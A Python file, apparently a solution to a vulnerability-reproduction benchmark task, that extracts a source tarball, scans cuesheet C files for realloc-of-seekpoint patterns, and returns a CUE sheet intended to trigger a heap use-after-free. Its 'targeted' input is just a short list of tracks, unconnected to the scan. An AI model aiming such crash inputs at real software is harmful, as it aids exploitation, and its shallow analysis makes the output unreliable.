import tarfile
import os
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the main source directory (common pattern)
            for root, dirs, files in os.walk(tmpdir):
                if 'configure' in files or 'Makefile.am' in files:
                    src_root = root
                    break
            else:
                src_root = tmpdir
            
            # Look for cuesheet-related source files
            cue_files = []
            for root, dirs, files in os.walk(src_root):
                for file in files:
                    if file.endswith('.c') and 'cue' in file.lower():
                        cue_files.append(os.path.join(root, file))
            
            # Analyze the most likely file
            if not cue_files:
                # Fallback to a generic PoC
                return self._generate_generic_poc()
            
            # Read and analyze the first cuesheet file
            with open(cue_files[0], 'r') as f:
                content = f.read()
            
            # Look for realloc patterns with seekpoints
            import re
            # Pattern for realloc of seekpoints array
            pattern = r'realloc.*seekpoint'
            matches = re.findall(pattern, content, re.IGNORECASE)
            
            if matches:
                # Found realloc pattern - generate targeted PoC
                return self._generate_targeted_poc()
            else:
                # Fallback to generic PoC
                return self._generate_generic_poc()
    
    def _generate_generic_poc(self) -> bytes:
        """Generate a generic cuesheet that triggers heap issues"""
        # Create a minimal valid CUE sheet with many seekpoints
        # to trigger reallocations and potential use-after-free
        poc = b'FILE "dummy.wav" WAVE\n'
        
        # Add many tracks with seekpoints to force reallocations
        for i in range(1, 100):
            poc += f'  TRACK {i:02d} AUDIO\n'.encode()
            poc += f'    INDEX 01 00:{i:02d}:00\n'.encode()
        
        return poc
    
    def _generate_targeted_poc(self) -> bytes:
        """Generate a more targeted PoC based on common patterns"""
        # Common pattern: realloc grows array, old pointer used
        # Create CUE with specific structure to trigger the bug
        
        poc = b'''FILE "test.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
  TRACK 02 AUDIO
    INDEX 01 00:01:00
  TRACK 03 AUDIO
    INDEX 01 00:02:00
  TRACK 04 AUDIO
    INDEX 01 00:03:00
  TRACK 05 AUDIO
    INDEX 01 00:04:00
  TRACK 06 AUDIO
    INDEX 01 00:05:00
  TRACK 07 AUDIO
    INDEX 01 00:06:00
  TRACK 08 AUDIO
    INDEX 01 00:07:00
  TRACK 09 AUDIO
    INDEX 01 00:08:00
  TRACK 10 AUDIO
    INDEX 01 00:09:00
  TRACK 11 AUDIO
    INDEX 01 00:10:00
  TRACK 12 AUDIO
    INDEX 01 00:11:00
'''
        return poc